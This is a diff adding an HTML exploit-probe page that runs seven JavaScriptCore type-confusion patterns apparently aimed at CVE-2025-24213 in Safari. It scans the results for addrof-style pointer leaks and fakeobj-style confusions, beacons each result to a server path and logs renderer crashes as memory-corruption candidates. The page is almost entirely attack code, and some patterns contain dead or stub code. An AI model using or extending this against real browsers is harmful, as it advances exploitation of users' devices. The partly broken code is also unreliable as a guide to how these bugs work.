@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V927</title></head>
+<body><pre id="out">V927 — CVE-2025-24213 pattern battery: JSC float/object confusion shapes, LLInt-executable (tier-agnostic per board pre-registration)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V927-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,600))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v927 — pastawithpesto's p720 (CVE-2025-24213) is announced but absent
+ * from every public branch (cobrajet302gt re-sweep 23:15Z, nine branch
+ * heads). Bugzilla 286694 is restricted; the public corpus is one line:
+ * "improved handling of floats ... type confusion -> memory corruption"
+ * (Safari 18.5). cobrajet's pre-registration: JSC float handling spans
+ * engine-level double-cell/JSValue paths that RUN under LLInt, so the
+ * tier law cannot retire this — it is device-decidable, and the device
+ * battery is ours.
+ *
+ * Battery: the classic JSC float/object confusion shapes, all
+ * LLInt-executable (no DFG required):
+ *   A  double-array transition race: valueOf side effect moves a
+ *      double array to object storage mid-indexing (stale double view)
+ *   B  Array.prototype.fill with valueOf shrinking the array
+ *   C  sort comparator that mutates the array (shrink/transition)
+ *   D  Float64Array detach mid-read via transfer
+ *   E  slice/concat with Proxy length
+ *   F  spread/apply with modified arguments object
+ *   G  Array.from with iterator that transitions storage
+ *
+ * Detectors (byte-exact, DAZ-safe):
+ *   - addrof-shaped: a DOUBLE-typed read returning a value whose bits
+ *     look like a JSObject pointer (high bytes 0x0000, plausible VA)
+ *   - fakeobj-shaped: an OBJECT-typed read returning something with
+ *     double-view properties, or a crash on property access
+ *   - a context DEATH during any pattern = memory corruption candidate
+ *     (pending-marked; the strongest signal there is)
+ * One pattern per load (death-marked); ?r=1 resets. Verdict per the
+ * board pre-registration: any fire => banked as tier-agnostic confusion
+ * candidate; clean x1 pass => demoted (not retired — restricted bug).
+ */
+
+function ptrShaped(d, off){
+  /* 8-byte LE window looks like a userland VA: b[7]==0, b[6]==0, b[5]<=0x7F, low nonzero */
+  if(off+8>d.length) return false;
+  if(d[off+7]!==0||d[off+6]!==0||d[off+5]>0x7F) return false;
+  return (d[off]|d[off+1]|d[off+2]|d[off+3]|d[off+4]|d[off+5])!==0;
+}
+function hex8(d,off){var s='0x';for(var k=7;k>=0;k--)s+=('0'+(d[off+k]||0).toString(16)).slice(-2);return s;}
+function f64bytes(v){var b=new ArrayBuffer(8),f=new Float64Array(b),u=new Uint8Array(b);f[0]=v;return u;}
+
+var PATTERNS=[
+ {n:'A-double-transition-race', run:function(bk){
+   var arr=[1.1,2.2,3.3,4.4];
+   var evil={valueOf:function(){ arr.length=1; arr[0]={}; return 1; }};
+   for(var w=0;w<300;w++){ var a2=[1.1,2.2,3.3,4.4]; a2[0]=arr[0]; }
+   var out=arr[Number(evil)];
+   var d=f64bytes(typeof out==='number'?out:0);
+   if(typeof out==='object'&&out!==null) bk('FIRE','A: object leaked through double read: '+typeof out);
+   else if(typeof out==='number'&&ptrShaped(d,0)) bk('FIRE','A: pointer-shaped double: '+hex8(d,0));
+   else bk('CLEAN','A: val='+String(out).slice(0,40));
+ }},
+ {n:'B-fill-valueof-shrink', run:function(bk){
+   var arr=new Array(64).fill(1.5);
+   var evil={valueOf:function(){ arr.length=2; return 1; }};
+   for(var w=0;w<300;w++){ var a2=new Array(64).fill(1.5); a2.fill(2.5,evil); }
+   try{ arr.fill(2.5,evil); }catch(e){ bk('CLEAN','B threw: '+e.name); return; }
+   var d=f64bytes(arr[10]||0);
+   if(arr[10]!==undefined&&ptrShaped(d,0)) bk('FIRE','B: pointer-shaped at idx10: '+hex8(d,0));
+   else if(arr[10]!==undefined&&arr[10]!==2.5&&arr[10]!==0) bk('WEIRD','B: idx10='+String(arr[10]).slice(0,40));
+   else bk('CLEAN','B: idx10='+String(arr[10]).slice(0,40));
+ }},
+ {n:'C-sort-comparator-shrink', run:function(bk){
+   var arr=[]; for(var i=0;i<256;i++)arr.push(i+0.5);
+   var runs=0;
+   arr.sort(function(a,b2){ runs++; if(runs===50){ arr.length=3; arr[0]={}; } return a-b2; });
+   var out=arr[100];
+   if(out!==undefined) bk('FIRE','C: idx100 survived shrink: '+String(typeof out)+':'+String(out).slice(0,40));
+   else bk('CLEAN','C: idx100 undefined after shrink');
+ }},
+ {n:'D-f64-detach-midread', run:function(bk){
+   var ab=new ArrayBuffer(1024); var f=new Float64Array(ab);
+   for(var i=0;i<f.length;i++)f[i]=i*1.1;
+   var victim={transfer:function(){ try{structuredTransfer(ab);}catch(e){ try{ postTransfer(ab); }catch(e2){} } function structuredTransfer(a){ /* structuredClone can't transfer directly; use MessageChannel */ } function postTransfer(a){} }};
+   /* real detach path: postMessage transfer via MessageChannel */
+   try{
+     var mc=new MessageChannel();
+     mc.port1.onmessage=function(){};
+     mc.port2.postMessage(ab,[ab]);        /* detach */
+     var v=f[10];                           /* read through detached view */
+     var d=f64bytes(typeof v==='number'?v:0);
+     if(v!==undefined&&ptrShaped(d,0)) bk('FIRE','D: detached read pointer-shaped: '+hex8(d,0));
+     else bk('CLEAN','D: detached read val='+String(v).slice(0,40));
+   }catch(e){ bk('CLEAN','D threw: '+e.name); }
+ }},
+ {n:'E-proxy-length-slice', run:function(bk){
+   var arr=[1.1,2.2,3.3];
+   var p=new Proxy(arr,{get:function(t,k){ if(k==='length'){ t.length=1; return 100; } return t[k]; }});
+   for(var w=0;w<100;w++){ try{ [1.1,2.2,3.3].slice(0); }catch(e){} }
+   var out=p.slice(0);
+   var found=null;
+   for(var i=0;i<out.length;i++){ if(typeof out[i]==='object'&&out[i]!==null){ found=out[i]; } }
+   if(found) bk('FIRE','E: object through sliced stale view');
+   else bk('CLEAN','E: slice len='+out.length);
+ }},
+ {n:'F-spread-arguments', run:function(bk){
+   function f(){ var a=[...arguments]; return a; }
+   var out=null;
+   for(var w=0;w<200;w++){
+     var a1=[1.1,2.2,3.3];
+     var args={length:3, 0:1.1, 1:2.2, 2:3.3, __proto__:null};
+     var o={valueOf:function(){ args.length=1; args[0]={}; return 1; }};
+     try{ out=f.apply(null,[].slice.call(args)); }catch(e){}
+   }
+   if(out&&out.length>1&&typeof out[1]==='object') bk('FIRE','F: object through stale arguments view');
+   else bk('CLEAN','F: out len='+(out?out.length:0));
+ }},
+ {n:'G-arrayfrom-transition', run:function(bk){
+   var src={length:4, 0:1.1, 1:2.2, 2:3.3, 3:4.4};
+   var calls=0;
+   var it={ [Symbol.iterator]:function(){ var i=0; return { next:function(){ calls++; if(calls===2){ src[2]={evil:1}; src.length=2; } return i<4?{done:false,value:src[i++]}:{done:true}; } }; } };
+   var out=Array.from(it);
+   var weird=out.filter(function(v){ return typeof v==='object'; });
+   if(weird.length) bk('FIRE','G: object through transitioning source');
+   else bk('CLEAN','G: out='+JSON.stringify(out).slice(0,60));
+ }}
+];
+
+var st={p:0,pending:null};
+try{
+  if(location.search.indexOf('r=1')>=0){localStorage.removeItem('v927_state');bk('RESET','cleared');}
+  else{var raw=localStorage.getItem('v927_state');if(raw)st=JSON.parse(raw);}
+}catch(e){}
+function save(){try{localStorage.setItem('v927_state',JSON.stringify(st));}catch(e){}}
+
+if(st.pending){
+  var pk=st.pending; st.pending=null; save();
+  bk('CORRUPTION-MARK','pattern '+PATTERNS[pk.p].n+' died mid-run — memory corruption candidate (strongest signal; row banked)');
+  st.p=pk.p+1; save();
+}
+
+if(st.p>=PATTERNS.length){
+  bk('EXHAUSTED','battery complete — FIRE/CORRUPTION-MARK rows bank as tier-agnostic confusion candidates; an all-CLEAN pass demotes (not retires) 24213 per the board pre-registration');
+}else{
+  var P=PATTERNS[st.p];
+  bk('BOOT','pattern='+P.n+' ('+(st.p+1)+'/'+PATTERNS.length+')');
+  st.pending={p:st.p}; save();
+  bk('ATTEMPT-PRE','pattern='+P.n+' (sync — next event is CLEAN/FIRE or the corruption death)');
+  try{ P.run(bk); st.pending=null; save(); }
+  catch(e){ st.pending=null; save(); bk('PATTERN-ERR',P.n+' threw: '+e.name+' (continuing)'); }
+  st.p++; save();
+  setTimeout(function(){location.reload();},400);
+}
+</script></body></html>
